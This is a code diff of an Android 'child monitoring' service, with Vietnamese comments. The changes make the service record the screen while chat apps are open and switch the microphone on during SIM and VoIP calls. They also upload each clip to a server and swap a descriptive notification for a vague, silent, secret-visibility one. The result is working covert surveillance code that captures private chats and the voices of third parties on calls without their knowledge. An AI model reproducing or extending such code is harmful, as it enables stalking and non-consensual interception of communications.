@@ -14,7 +14,14 @@ import android.os.IBinder
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.example.childmonitoringapp.R
+import com.example.childmonitoringapp.upload.UploadWorker
 import java.io.File
+
+// Telephony + Audio mode
+import android.media.AudioManager
+import android.telephony.TelephonyCallback
+import android.telephony.TelephonyManager
+import android.telephony.PhoneStateListener
 
 class MonitoringService : Service() {
 
@@ -24,58 +31,90 @@ class MonitoringService : Service() {
 
     private lateinit var mediaProjectionManager: MediaProjectionManager
     private var mediaProjection: MediaProjection? = null
+
     private var mediaRecorder: MediaRecorder? = null
     private var virtualDisplay: VirtualDisplay? = null
     private var recorderSurface: android.view.Surface? = null
 
-
     private var isRecording = false
     private val handler = android.os.Handler(android.os.Looper.getMainLooper())
 
-    companion object {
-        const val ACTION_SET_PROJECTION = "SET_PROJECTION"
-        const val ACTION_START_SCREEN   = "START_SCREEN"
-        const val ACTION_STOP_SCREEN    = "STOP_SCREEN"
-        const val ACTION_SPLIT_SCREEN   = "SPLIT_SCREEN"
+    // ==== Mic theo trạng thái gọi ====
+    private var callActive = false              // SIM call (telephony)
+    private var inComm = false                  // VoIP: AudioManager.MODE_IN_COMMUNICATION
+    private var wantMic = false                 // có bật MIC cho screen-rec không?
 
-        const val ACTION_AUDIO_ON       = "AUDIO_ON"
-        const val ACTION_AUDIO_OFF      = "AUDIO_OFF"
+    // ==== Upload meta ====
+    private var lastVideoFile: File? = null
+    private var currentAppTag: String = "unknown"
 
-        // ✅ key lưu trạng thái ghi âm (true: có mic, false: mute)
-        private const val KEY_RECORD_AUDIO = "record_audio"
+    // Prefs (nếu cần dùng sau này)
+    private val prefs by lazy { getSharedPreferences("mprefs", Context.MODE_PRIVATE) }
+
+    // Cắt file theo thời gian (ví dụ 10 phút)
+    private val MAX_SEGMENT_MS = 10 * 60 * 1000L
+    private var rollTask: Runnable? = null
+
+    // Poll audio mode để nhận biết VoIP
+    private val audioPoll = object : Runnable {
+        override fun run() {
+            val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
+            val now = (am.mode == AudioManager.MODE_IN_COMMUNICATION)
+            if (now != inComm) {
+                inComm = now
+                applyMicStateIfChanged("inComm=$inComm")
+            }
+            handler.postDelayed(this, 1000)
+        }
     }
+
     override fun onCreate() {
         super.onCreate()
         Log.w(TAG, "onCreate()")
-        // ✅ QUAN TRỌNG: reset cờ vì service có thể vừa bị hệ thống restart
-        prefs.edit().putBoolean("hasProjection", false).apply()
 
         mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
         createNotificationChannel()
         startForeground(NOTIFICATION_ID, createNotification())
-    }
 
-    private val MAX_SEGMENT_MS = 5 * 60 * 1000L  // 2 phút (test). Prod: 10 * 60 * 1000L
-    private var rollTask: Runnable? = null
-
-    private fun startRolling() {
-        cancelRolling()
-        rollTask = Runnable {
-            if (isRecording) {
-                // cắt sang file mới
-                stopRecording()
-                handler.postDelayed({ startScreenRecording() }, 200)
-                startRolling()
-            }
+        // Telephony (SIM call) → cập nhật callActive
+        val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            tm.registerTelephonyCallback(
+                mainExecutor,
+                object : TelephonyCallback(), TelephonyCallback.CallStateListener {
+                    override fun onCallStateChanged(state: Int) {
+                        when (state) {
+                            TelephonyManager.CALL_STATE_OFFHOOK,
+                            TelephonyManager.CALL_STATE_RINGING -> {
+                                if (!callActive) { callActive = true; applyMicStateIfChanged("telephony=ON") }
+                            }
+                            TelephonyManager.CALL_STATE_IDLE -> {
+                                if (callActive) { callActive = false; applyMicStateIfChanged("telephony=OFF") }
+                            }
+                        }
+                    }
+                }
+            )
+        } else {
+            @Suppress("DEPRECATION")
+            tm.listen(object : PhoneStateListener() {
+                override fun onCallStateChanged(state: Int, incomingNumber: String?) {
+                    when (state) {
+                        TelephonyManager.CALL_STATE_OFFHOOK,
+                        TelephonyManager.CALL_STATE_RINGING -> {
+                            if (!callActive) { callActive = true; applyMicStateIfChanged("telephony=ON") }
+                        }
+                        TelephonyManager.CALL_STATE_IDLE -> {
+                            if (callActive) { callActive = false; applyMicStateIfChanged("telephony=OFF") }
+                        }
+                    }
+                }
+            }, PhoneStateListener.LISTEN_CALL_STATE)
         }
-        handler.postDelayed(rollTask!!, MAX_SEGMENT_MS)
-    }
 
-    private fun cancelRolling() {
-        rollTask?.let { handler.removeCallbacks(it) }
-        rollTask = null
+        // Bắt đầu poll audio mode (VoIP)
+        handler.post(audioPoll)
     }
-    private val prefs by lazy { getSharedPreferences("mprefs", Context.MODE_PRIVATE) }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.w(TAG, "onStartCommand(): act=${intent?.action}")
@@ -85,35 +124,31 @@ class MonitoringService : Service() {
                 val pd = intent.getParcelableExtra<Intent>("projectionData")
                 if (rc == Activity.RESULT_OK && pd != null) {
                     mediaProjection = mediaProjectionManager.getMediaProjection(rc, pd)
-                    // ✅ bật cờ: đã có projection
-                    prefs.edit().putBoolean("hasProjection", true).apply()
-
-                    // ✅ nếu hệ thống revoke projection → tắt cờ + dừng quay
                     mediaProjection?.registerCallback(object : MediaProjection.Callback() {
                         override fun onStop() {
                             Log.w(TAG, "MediaProjection revoked by system")
-                            prefs.edit().putBoolean("hasProjection", false).apply()
                             if (isRecording) stopRecording()
                             mediaProjection = null
                         }
                     }, handler)
-
                     Log.w(TAG, "MediaProjection READY")
+                    prefs.edit().putBoolean("hasProjection", true).apply()
                 } else {
+                    prefs.edit().putBoolean("hasProjection", false).apply()
                     Log.e(TAG, "SET_PROJECTION missing extras")
                 }
             }
 
             ACTION_START_SCREEN -> {
+                currentAppTag = intent.getStringExtra("appTag") ?: "unknown"
                 if (mediaProjection == null) {
                     Log.e(TAG, "No MediaProjection")
                     return START_STICKY
                 }
-                if (!isRecording) startScreenRecording()
-            }
-
-            ACTION_STOP_SCREEN -> {
-                if (isRecording) stopRecording()
+                if (!isRecording) {
+                    startScreenRecording()
+                    updateNotification("Đang quay màn hình ($currentAppTag)")
+                }
             }
 
             ACTION_SPLIT_SCREEN -> {
@@ -125,25 +160,34 @@ class MonitoringService : Service() {
                     startScreenRecording()
                 }
             }
-            ACTION_AUDIO_ON -> {
-                prefs.edit().putBoolean(KEY_RECORD_AUDIO, true).apply()
-                Log.d(TAG, "Screen audio = ON")
-            }
-            ACTION_AUDIO_OFF -> {
-                prefs.edit().putBoolean(KEY_RECORD_AUDIO, false).apply()
-                Log.d(TAG, "Screen audio = OFF")
-            }
+
+            ACTION_STOP_SCREEN -> if (isRecording) stopRecording()
         }
         startForeground(NOTIFICATION_ID, createNotification())
         return START_STICKY
     }
 
+    // ==== MIC theo trạng thái gọi ====
+    private fun shouldMic(): Boolean = callActive || inComm
 
-    // ❗Align bội 16 tránh 720x1527
+    private fun applyMicStateIfChanged(reason: String) {
+        val newWant = shouldMic()
+        if (newWant == wantMic) return
+        wantMic = newWant
+        Log.d(TAG, "MIC state -> $wantMic (reason=$reason)")
+        if (isRecording) {
+            // split clip để phần sau có/không có MIC đúng trạng thái
+            stopRecording()
+            handler.postDelayed({ startScreenRecording() }, 200)
+        }
+    }
+
+    // ==== Screen record (MIC theo wantMic) ====
     private fun align16(v: Int) = ((v / 16).coerceAtLeast(1)) * 16
 
     private fun startScreenRecording() {
         if (mediaProjection == null || isRecording) return
+
         val moviesDir = getExternalFilesDir(Environment.DIRECTORY_MOVIES)!!.apply { mkdirs() }
         val outFile = File(moviesDir, "screen_record_${System.currentTimeMillis()}.mp4")
         Log.d(TAG, "Saving to: ${outFile.absolutePath}")
@@ -153,144 +197,121 @@ class MonitoringService : Service() {
         val height = align16(dm.heightPixels.coerceAtLeast(320))
         val densityDpi = dm.densityDpi
 
-        val includeAudio = prefs.getBoolean(KEY_RECORD_AUDIO, false) // mặc định: mute
+        // Quyết định có thu MIC hay không (tuỳ logic của bạn)
+        // Nếu bạn muốn “chỉ lúc gọi mới thu”, đặt includeAudio = wantMic
+        val includeAudio = wantMic
 
-        mediaRecorder = MediaRecorder().apply {
-            setVideoSource(MediaRecorder.VideoSource.SURFACE)
-            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
+        val mr = MediaRecorder()
+        mediaRecorder = mr
+        try {
+            // *** THỨ TỰ ĐÚNG ***
+            if (includeAudio) {
+                mr.setAudioSource(MediaRecorder.AudioSource.MIC)
+            }
+            mr.setVideoSource(MediaRecorder.VideoSource.SURFACE)
+            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
 
             if (includeAudio) {
-                setAudioSource(MediaRecorder.AudioSource.MIC)
-                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-                setAudioEncodingBitRate(128_000)
-                setAudioSamplingRate(44100)
+                mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                mr.setAudioEncodingBitRate(128_000)
+                mr.setAudioSamplingRate(44100)
+                mr.setAudioChannels(1)
             }
 
-            setVideoSize(width, height)
-            setVideoFrameRate(20)
-            setVideoEncodingBitRate(2_500_000)
-            setOutputFile(outFile.absolutePath)
+            mr.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
+            mr.setVideoSize(width, height)
+            mr.setVideoFrameRate(20)
+            mr.setVideoEncodingBitRate(2_500_000)
 
-            try {
-                prepare()
-                recorderSurface = this.surface
-                virtualDisplay = mediaProjection?.createVirtualDisplay(
-                    "ScreenCapture",
-                    width, height, densityDpi,
-                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-                    recorderSurface, null, null
-                ) ?: throw IllegalStateException("VirtualDisplay null")
+            mr.setOutputFile(outFile.absolutePath)
 
-                start()
-                isRecording = true
-                Log.d(TAG, "Screen recording started (${width}x$height @20fps, audio=$includeAudio)")
-                startRolling() // nếu bạn giữ tính năng cắt theo thời gian
-            } catch (e: Exception) {
-                Log.e(TAG, "Failed to start recording: ${e.message}", e)
-                releaseRecorder()
-                outFile.delete()
+            // (tuỳ chọn) theo dõi info/error để debug
+            mr.setOnInfoListener { _, what, extra ->
+                Log.w(TAG, "VIDEO MR_INFO what=$what extra=$extra")
             }
+            mr.setOnErrorListener { _, what, extra ->
+                Log.e(TAG, "VIDEO MR_ERROR what=$what extra=$extra")
+                // nếu muốn tự restart:
+                try { stopRecording() } catch (_: Throwable) {}
+            }
+
+            mr.prepare()
+
+            // surface phải lấy SAU prepare
+            recorderSurface = mr.surface
+            virtualDisplay = mediaProjection?.createVirtualDisplay(
+                "ScreenCapture",
+                width, height, densityDpi,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                recorderSurface, null, null
+            ) ?: throw IllegalStateException("VirtualDisplay null")
+
+            // lưu file hiện hành để UploadWorker dùng khi stop
+            lastVideoFile = outFile
+
+            mr.start()
+            isRecording = true
+            Log.d(TAG, "Screen recording started (${width}x$height @20fps, audio=$includeAudio)")
+
+//            startRolling() // nếu bạn còn muốn cắt theo thời gian
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to start recording: ${e.message}", e)
+            // thu dọn sạch
+            try { mr.reset(); mr.release() } catch (_: Throwable) {}
+            mediaRecorder = null
+            try { recorderSurface?.release() } catch (_: Throwable) {}
+            recorderSurface = null
+            try { virtualDisplay?.release() } catch (_: Throwable) {}
+            virtualDisplay = null
+            // xoá file rỗng
+            runCatching { if (outFile.length() == 0L) outFile.delete() }
         }
     }
 
-
-    override fun onDestroy() {
-        super.onDestroy()
-
-        prefs.edit().putBoolean("hasProjection", false).apply() // ✅ clear cờ
-        stopRecording()
-        mediaProjection?.stop()
-        mediaProjection = null
-    }
-
-//    private fun startScreenRecording() {
-//        if (mediaProjection == null || isRecording) return
-//        val moviesDir = getExternalFilesDir(Environment.DIRECTORY_MOVIES)!!
-//        if (!moviesDir.exists()) moviesDir.mkdirs()
-//
-//        val outFile = File(moviesDir, "screen_record_${System.currentTimeMillis()}.mp4")
-//        Log.d(TAG, "Saving to: ${outFile.absolutePath}")
-//
-//        val metrics = resources.displayMetrics
-//        val width = metrics.widthPixels
-//        val height = metrics.heightPixels
-//        val densityDpi = metrics.densityDpi
-//
-//        mediaRecorder = MediaRecorder().apply {
-//            setVideoSource(MediaRecorder.VideoSource.SURFACE)
-//            setAudioSource(MediaRecorder.AudioSource.MIC)
-//            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-//            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
-//            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-//            setVideoSize(width, height)
-//            setVideoFrameRate(30)
-//            setVideoEncodingBitRate(5_000_000)
-//            setOutputFile(outFile.absolutePath)
-//            try {
-//                prepare()
-//                recorderSurface = this.surface
-//                virtualDisplay = mediaProjection?.createVirtualDisplay(
-//                    "ScreenCapture",
-//                    width, height, densityDpi,
-//                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-//                    recorderSurface, null, null          // ✅ dùng recorderSurface
-//                ) ?: throw IllegalStateException("VirtualDisplay null")
-//
-//                start()
-//                isRecording = true
-//                Log.d(TAG, "Screen recording started (${width}x$height @30fps)")
-//                startRolling()                          // ✅ bắt đầu rolling theo thời gian
-//            } catch (e: Exception) {
-//                Log.e(TAG, "Failed to start recording: ${e.message}", e)
-//                releaseRecorder()
-//                outFile.delete()
+//    private fun startRolling() {
+//        cancelRolling()
+//        rollTask = Runnable {
+//            if (isRecording) {
+//                stopRecording()
+//                handler.postDelayed({ startScreenRecording() }, 200)
+//                startRolling()
 //            }
 //        }
+//        handler.postDelayed(rollTask!!, MAX_SEGMENT_MS)
+//    }
+//
+//    private fun cancelRolling() {
+//        rollTask?.let { handler.removeCallbacks(it) }
+//        rollTask = null
 //    }
 
     private fun stopRecording() {
-        cancelRolling()                                // ✅ dừng rolling
+//        cancelRolling()
         mediaRecorder?.let {
-            try { it.stop(); it.reset() } catch (e: Exception) { Log.e(TAG, "stop err: ${e.message}") }
-            finally { it.release() }
+            try { it.stop(); it.reset() } catch (_: Exception) {}
+            it.release()
         }
         mediaRecorder = null
         virtualDisplay?.release(); virtualDisplay = null
         recorderSurface?.release(); recorderSurface = null
         isRecording = false
-        Log.d(TAG, "Recording stopped & resources released")
+        Log.d(TAG, "Screen recording stopped & resources released")
+
+        // Đẩy clip lên server
+        val f = lastVideoFile
+        lastVideoFile = null
+        if (f != null && f.exists() && f.length() > 0) {
+            UploadWorker.enqueue(
+                context = this,
+                path = f.absolutePath,
+                app = currentAppTag,   // "zalo" / "messenger" / "telegram" / "sms" ...
+                note = null,
+                durationSec = null
+            )
+        }
     }
 
-//    private fun stopRecording() {
-//        mediaRecorder?.let {
-//            try {
-//                it.stop()
-//                it.reset()
-//            } catch (e: Exception) {
-//                Log.e(TAG, "Error stopping recorder: ${e.message}")
-//            } finally {
-//                it.release()
-//            }
-//        }
-//        mediaRecorder = null
-//        virtualDisplay?.release()
-//        virtualDisplay = null
-//        recorderSurface?.release()
-//        recorderSurface = null
-//        isRecording = false
-//        Log.d(TAG, "Recording stopped & resources released")
-//    }
-
-    private fun releaseRecorder() {
-        try { mediaRecorder?.release() } catch (_: Throwable) {}
-        mediaRecorder = null
-        try { virtualDisplay?.release() } catch (_: Throwable) {}
-        virtualDisplay = null
-        try { recorderSurface?.release() } catch (_: Throwable) {}
-        recorderSurface = null
-    }
-
+    // ==== Notification ====
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
@@ -302,22 +323,42 @@ class MonitoringService : Service() {
 
     private fun createNotification(): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setSmallIcon(R.mipmap.ic_launcher) // đổi icon nếu cần
-            .setContentTitle("Đang chạy nền")
-            .setContentText("Quay màn hình khi ứng dụng chat ở nền trước")
+            .setSmallIcon(android.R.drawable.stat_notify_more)
+            .setContentTitle("Dịch vụ đang chạy")
+            .setContentText("Theo dõi ứng dụng theo cài đặt của bạn")
             .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setSilent(true)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build()
     }
 
-//    override fun onDestroy() {
-//        super.onDestroy()
-//        handler.removeCallbacksAndMessages(null)
-//        stopRecording()
-//        mediaProjection?.stop()
-//        mediaProjection = null
-//    }
+    private fun updateNotification(text: String) {
+        val nm = getSystemService(NotificationManager::class.java)
+        val n = NotificationCompat.Builder(this, CHANNEL_ID)
+            .setSmallIcon(android.R.drawable.stat_notify_more)
+            .setOngoing(true)
+            .setSilent(true)
+            .setContentTitle("Dịch vụ đang chạy")
+            .setContentText(text)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .build()
+        nm.notify(NOTIFICATION_ID, n)
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        handler.removeCallbacks(audioPoll)
+        stopRecording()
+        mediaProjection?.stop()
+        mediaProjection = null
+    }
 
     override fun onBind(intent: Intent?): IBinder? = null
+
+    companion object {
+        const val ACTION_SET_PROJECTION = "SET_PROJECTION"
+        const val ACTION_START_SCREEN   = "START_SCREEN"
+        const val ACTION_STOP_SCREEN    = "STOP_SCREEN"
+        const val ACTION_SPLIT_SCREEN   = "SPLIT_SCREEN"
+    }
 }
